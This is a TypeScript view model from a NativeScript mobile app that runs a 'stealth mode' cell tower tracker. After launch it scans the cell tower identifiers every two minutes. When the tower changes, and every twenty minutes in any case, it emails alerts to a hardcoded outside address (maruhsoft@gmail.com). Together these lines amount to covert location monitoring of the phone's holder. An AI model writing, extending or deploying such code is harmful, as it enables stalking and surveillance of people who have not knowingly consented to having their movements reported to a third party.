import { Observable } from '@nativescript/core';
import { CellTowerService, CellTowerInfo } from './services/cell-tower.service';
import { EmailService } from './services/email.service';
import { isAndroid } from '@nativescript/core/platform';

export class HelloWorldModel extends Observable {
  private cellTowerService: CellTowerService;
  private emailService: EmailService;
  private _isLoading: boolean = false;
  private _hasData: boolean = false;
  private _statusMessage: string = 'Stealth mode initializing...';
  private _statusClass: string = 'text-blue-600';
  private _refreshButtonText: string = 'Manual Scan';
  private _emailButtonText: string = 'Send Email';
  private _emailStatusVisible: boolean = false;
  private _emailStatusMessage: string = '';
  private _emailStatusClass: string = '';
  private _isEmailLoading: boolean = false;
  private autoScanInterval: any;
  private scanCount: number = 0;
  private currentCellData: CellTowerInfo | null = null;
  private previousCellData: CellTowerInfo | null = null;

  // Cell tower data properties
  private _mcc: string = '';
  private _mnc: string = '';
  private _lac: string = '';
  private _cid: string = '';
  private _signalStrength: number = 0;
  private _signalStrengthClass: string = 'text-gray-500';
  private _networkType: string = '';
  private _carrierName: string = '';
  private _countryCode: string = '';
  private _rssi: number = 0;
  private _lastUpdated: string = '';

  constructor() {
    super();
    this.cellTowerService = new CellTowerService();
    this.emailService = new EmailService();
    this.updateStatus('Stealth mode starting...', 'text-blue-600');
    
    // Start stealth mode after a short delay
    setTimeout(() => {
      this.startStealthMode();
    }, 3000);
  }

  // Getters for data binding
  get isLoading(): boolean { return this._isLoading; }
  get hasData(): boolean { return this._hasData; }
  get statusMessage(): string { return this._statusMessage; }
  get statusClass(): string { return this._statusClass; }
  get refreshButtonText(): string { return this._refreshButtonText; }
  get emailButtonText(): string { return this._emailButtonText; }
  get emailStatusVisible(): boolean { return this._emailStatusVisible; }
  get emailStatusMessage(): string { return this._emailStatusMessage; }
  get emailStatusClass(): string { return this._emailStatusClass; }
  get canSendEmail(): boolean { return !this._isLoading && !this._isEmailLoading && this._hasData; }
  
  get mcc(): string { return this._mcc; }
  get mnc(): string { return this._mnc; }
  get lac(): string { return this._lac; }
  get cid(): string { return this._cid; }
  get signalStrength(): string { 
    return this._signalStrength > 0 ? `${this._signalStrength}%` : 'Unknown';
  }
  get signalStrengthClass(): string { return this._signalStrengthClass; }
  get networkType(): string { return this._networkType; }
  get carrierName(): string { return this._carrierName; }
  get countryCode(): string { return this._countryCode; }
  get rssi(): number { return this._rssi; }
  get lastUpdated(): string { return this._lastUpdated; }

  private startStealthMode() {
    this.updateStatus('Stealth mode active - monitoring every 2 minutes', 'text-green-600');
    
    // Perform initial scan
    this.performStealthScan();
    
    // Set up automatic scanning every 2 minutes (120 seconds)
    this.autoScanInterval = setInterval(() => {
      this.performStealthScan();
    }, 120000); // 2 minutes
  }

  private async performStealthScan() {
    try {
      // Check permissions first on Android
      if (isAndroid) {
        const hasPermission = await this.checkAndRequestPermissions();
        if (!hasPermission) {
          this.updateStatus('Stealth mode: Permissions required', 'text-yellow-600');
          return;
        }
      }

      const cellInfo = await this.cellTowerService.getCellTowerInfo();
      
      if (cellInfo) {
        this.scanCount++;
        
        // Check if cell tower has changed
        const cellTowerChanged = this.hasCellTowerChanged(cellInfo);
        
        // Update current data
        this.currentCellData = cellInfo;
        this.updateCellData(cellInfo);
        this._hasData = true;
        this.notifyPropertyChange('hasData', this._hasData);
        this.notifyPropertyChange('canSendEmail', this.canSendEmail);
        
        if (cellTowerChanged) {
          this.updateStatus(`Stealth scan #${this.scanCount} - Cell tower changed! Sending alert...`, 'text-orange-600');
          
          // Send email notification about cell tower change
          const emailSent = await this.emailService.sendCellTowerChangeAlert(cellInfo, this.previousCellData);
          if (emailSent) {
            console.log('Cell tower change alert sent successfully');
            this.updateEmailStatus('Cell tower change alert sent', 'text-green-600');
            this.updateStatus(`Stealth scan #${this.scanCount} - Alert sent successfully`, 'text-green-600');
          } else {
            console.log('Failed to send cell tower change alert');
            this.updateEmailStatus('Failed to send change alert', 'text-red-600');
            this.updateStatus(`Stealth scan #${this.scanCount} - Alert failed to send`, 'text-red-600');
          }
          
          // Update previous data for next comparison
          this.previousCellData = { ...cellInfo };
        } else {
          this.updateStatus(`Stealth scan #${this.scanCount} - No changes detected`, 'text-green-600');
          
          // Still send periodic update every 10 scans (20 minutes)
          if (this.scanCount % 10 === 0) {
            const emailSent = await this.emailService.sendPeriodicUpdate(cellInfo, this.scanCount);
            if (emailSent) {
              this.updateEmailStatus('Periodic update sent', 'text-blue-600');
            }
          }
        }
        
        // Set initial previous data if this is the first scan
        if (!this.previousCellData) {
          this.previousCellData = { ...cellInfo };
        }
      } else {
        this.updateStatus(`Stealth scan #${this.scanCount} - No cell data available`, 'text-yellow-600');
      }
    } catch (error) {
      console.error('Error in stealth scan:', error);
      this.updateStatus('Stealth scan error occurred', 'text-red-600');
    }
  }

  private hasCellTowerChanged(newCellInfo: CellTowerInfo): boolean {
    if (!this.previousCellData) {
      return true; // First scan, consider it a change
    }
    
    // Compare key identifiers that indicate a cell tower change
    return (
      this.previousCellData.mcc !== newCellInfo.mcc ||
      this.previousCellData.mnc !== newCellInfo.mnc ||
      this.previousCellData.lac !== newCellInfo.lac ||
      this.previousCellData.cid !== newCellInfo.cid ||
      this.previousCellData.carrierName !== newCellInfo.carrierName
    );
  }

  public async refreshData() {
    if (this._isLoading) return;
    
    this.setLoading(true);
    this.updateStatus('Manual scan in progress...', 'text-blue-600');
    
    try {
      // Check permissions first on Android
      if (isAndroid) {
        const hasPermission = await this.checkAndRequestPermissions();
        if (!hasPermission) {
          this.updateStatus('Location permission required to access cell tower data', 'text-red-600');
          this.setLoading(false);
          return;
        }
      }

      const cellInfo = await this.cellTowerService.getCellTowerInfo();
      
      if (cellInfo) {
        this.currentCellData = cellInfo;
        this.updateCellData(cellInfo);
        this.updateStatus('Manual scan completed successfully', 'text-green-600');
        this._hasData = true;
        this.notifyPropertyChange('hasData', this._hasData);
        this.notifyPropertyChange('canSendEmail', this.canSendEmail);
      } else {
        this.updateStatus('Unable to retrieve cell tower data', 'text-red-600');
        this._hasData = false;
        this.notifyPropertyChange('hasData', this._hasData);
        this.notifyPropertyChange('canSendEmail', this.canSendEmail);
      }
    } catch (error) {
      console.error('Error refreshing cell data:', error);
      this.updateStatus(`Error: ${error.message}`, 'text-red-600');
      this._hasData = false;
      this.notifyPropertyChange('hasData', this._hasData);
      this.notifyPropertyChange('canSendEmail', this.canSendEmail);
    } finally {
      this.setLoading(false);
    }
  }

  public async sendEmailManually() {
    if (this._isLoading || this._isEmailLoading || !this.currentCellData) return;
    
    this.setEmailLoading(true);
    this.updateEmailStatus('Sending manual report...', 'text-blue-600');
    
    try {
      const emailSent = await this.emailService.sendManualReport(this.currentCellData);
      
      if (emailSent) {
        this.updateEmailStatus('Manual report sent successfully to maruhsoft@gmail.com', 'text-green-600');
      } else {
        this.updateEmailStatus('Failed to send manual report. Please try again.', 'text-red-600');
      }
    } catch (error) {
      console.error('Error sending manual email:', error);
      this.updateEmailStatus(`Email error: ${error.message}`, 'text-red-600');
    } finally {
      this.setEmailLoading(false);
      
      // Hide email status after 5 seconds
      setTimeout(() => {
        this._emailStatusVisible = false;
        this.notifyPropertyChange('emailStatusVisible', this._emailStatusVisible);
      }, 5000);
    }
  }

  private async checkAndRequestPermissions(): Promise<boolean> {
    try {
      const context = require('@nativescript/core').Utils.android.getApplicationContext();
      const PackageManager = android.content.pm.PackageManager;
      
      // Check multiple permissions that might be needed
      const permissions = [
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.READ_PHONE_STATE
      ];
      
      let allGranted = true;
      
      for (const permission of permissions) {
        const hasPermission = context.checkSelfPermission(permission) === PackageManager.PERMISSION_GRANTED;
        if (!hasPermission) {
          console.log(`Missing permission: ${permission}`);
          allGranted = false;
        }
      }
      
      if (!allGranted) {
        console.log('Some permissions are missing. Please grant location and phone permissions in device settings.');
        return false;
      }
      
      return true;
    } catch (error) {
      console.error('Permission error:', error);
      return false;
    }
  }

  private updateCellData(cellInfo: CellTowerInfo) {
    this._mcc = cellInfo.mcc || 'Unknown';
    this._mnc = cellInfo.mnc || 'Unknown';
    this._lac = cellInfo.lac || 'Unknown';
    this._cid = cellInfo.cid || 'Unknown';
    this._signalStrength = cellInfo.signalStrength || 0;
    this._networkType = cellInfo.networkType || 'Unknown';
    this._carrierName = cellInfo.carrierName || 'Unknown';
    this._countryCode = cellInfo.countryCode || 'Unknown';
    this._rssi = cellInfo.rssi || -999;
    this._lastUpdated = new Date().toLocaleString();

    // Update signal strength color
    if (this._signalStrength >= 75) {
      this._signalStrengthClass = 'text-green-600';
    } else if (this._signalStrength >= 50) {
      this._signalStrengthClass = 'text-yellow-600';
    } else if (this._signalStrength > 0) {
      this._signalStrengthClass = 'text-red-600';
    } else {
      this._signalStrengthClass = 'text-gray-500';
    }

    // Notify all property changes
    this.notifyPropertyChange('mcc', this._mcc);
    this.notifyPropertyChange('mnc', this._mnc);
    this.notifyPropertyChange('lac', this._lac);
    this.notifyPropertyChange('cid', this._cid);
    this.notifyPropertyChange('signalStrength', this.signalStrength);
    this.notifyPropertyChange('signalStrengthClass', this._signalStrengthClass);
    this.notifyPropertyChange('networkType', this._networkType);
    this.notifyPropertyChange('carrierName', this._carrierName);
    this.notifyPropertyChange('countryCode', this._countryCode);
    this.notifyPropertyChange('rssi', this._rssi);
    this.notifyPropertyChange('lastUpdated', this._lastUpdated);
  }

  private setLoading(loading: boolean) {
    this._isLoading = loading;
    this._refreshButtonText = loading ? 'Scanning...' : 'Manual Scan';
    this.notifyPropertyChange('isLoading', this._isLoading);
    this.notifyPropertyChange('refreshButtonText', this._refreshButtonText);
    this.notifyPropertyChange('canSendEmail', this.canSendEmail);
  }

  private setEmailLoading(loading: boolean) {
    this._isEmailLoading = loading;
    this._emailButtonText = loading ? 'Sending...' : 'Send Email';
    this.notifyPropertyChange('emailButtonText', this._emailButtonText);
    this.notifyPropertyChange('canSendEmail', this.canSendEmail);
  }

  private updateStatus(message: string, className: string) {
    this._statusMessage = message;
    this._statusClass = className;
    this.notifyPropertyChange('statusMessage', this._statusMessage);
    this.notifyPropertyChange('statusClass', this._statusClass);
  }

  private updateEmailStatus(message: string, className: string) {
    this._emailStatusMessage = message;
    this._emailStatusClass = className;
    this._emailStatusVisible = true;
    this.notifyPropertyChange('emailStatusMessage', this._emailStatusMessage);
    this.notifyPropertyChange('emailStatusClass', this._emailStatusClass);
    this.notifyPropertyChange('emailStatusVisible', this._emailStatusVisible);
  }

  // Clean up interval when the view model is destroyed
  public destroy() {
    if (this.autoScanInterval) {
      clearInterval(this.autoScanInterval);
    }
  }
}